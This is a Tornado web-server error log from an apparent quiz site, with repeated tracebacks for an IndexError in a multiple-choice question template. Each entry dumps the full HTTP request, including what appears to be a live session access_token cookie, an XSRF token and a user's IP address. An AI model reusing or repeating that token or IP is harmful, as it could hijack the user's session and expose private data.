 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e3428e4c8548017fb425&answers=%5B0%2C2%2C3%5D&cursor=1&_xsrf=b057d380dd7e426fb522f38715a8f7e0', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '100', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLdnBsWWxaQTh4ZWNBQVJwMVBldGMzMnlsOFRpTjZFSnV0RWdVSXNoMWNHZ0lVYlRZWkNxa1pDVFBUSnJBc0JPVkdrWXJWeDRIRUI3V25tZ2NwSU8wdURFUVBoQVpEWkQ=|1348067635|2775cbbf5d1f5cddbe731e914c3392c2f36116c6"; _xsrf=b057d380dd7e426fb522f38715a8f7e0; __utma=188782963.1501492801.1348064264.1348064264.1348064264.1; __utmb=188782963.8.10.1348064264; __utmc=188782963; __utmz=188782963.1348064264.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 98.12ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e3428e4c8548017fb425&answers=%5B3%5D&cursor=12&_xsrf=b057d380dd7e426fb522f38715a8f7e0', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLdnBsWWxaQTh4ZWNBQVJwMVBldGMzMnlsOFRpTjZFSnV0RWdVSXNoMWNHZ0lVYlRZWkNxa1pDVFBUSnJBc0JPVkdrWXJWeDRIRUI3V25tZ2NwSU8wdURFUVBoQVpEWkQ=|1348067635|2775cbbf5d1f5cddbe731e914c3392c2f36116c6"; _xsrf=b057d380dd7e426fb522f38715a8f7e0; __utma=188782963.1501492801.1348064264.1348064264.1348064264.1; __utmb=188782963.8.10.1348064264; __utmc=188782963; __utmz=188782963.1348064264.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 117.86ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e3428e4c8548017fb425&answers=%5B0%5D&cursor=14&_xsrf=b057d380dd7e426fb522f38715a8f7e0', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLdnBsWWxaQTh4ZWNBQVJwMVBldGMzMnlsOFRpTjZFSnV0RWdVSXNoMWNHZ0lVYlRZWkNxa1pDVFBUSnJBc0JPVkdrWXJWeDRIRUI3V25tZ2NwSU8wdURFUVBoQVpEWkQ=|1348067635|2775cbbf5d1f5cddbe731e914c3392c2f36116c6"; _xsrf=b057d380dd7e426fb522f38715a8f7e0; __utma=188782963.1501492801.1348064264.1348064264.1348064264.1; __utmb=188782963.8.10.1348064264; __utmc=188782963; __utmz=188782963.1348064264.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 79.68ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
